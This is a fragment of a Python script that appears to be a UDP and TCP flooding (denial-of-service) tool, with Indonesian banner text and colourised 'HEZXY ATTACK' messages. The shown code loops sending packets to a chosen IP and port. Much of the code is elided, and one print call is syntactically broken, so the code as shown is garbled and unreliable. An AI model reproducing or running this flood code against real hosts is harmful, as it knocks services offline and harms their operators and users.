...
| TOOLS INI DENGAN BAIK SALAM DARI ||AYAHKAU|||
#===========================================#""")
print("\033[92m")
print("""
	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
			print(+"\033[0;37;50m HEZXY COLI ip %s \033[95mport %s"%(ip,port))
		except:
			print("\033[0;37;95m HEZXY SEREPET IP %s \033[92m HEZXY SEREPET PORT %s"%(ip,port))
...
def tcp():
	...
	while True:
		try:
			...
			s.close()
			print("\033[1;31;95m HEZXY ATTACK!! %s port %s"%(ip,port))
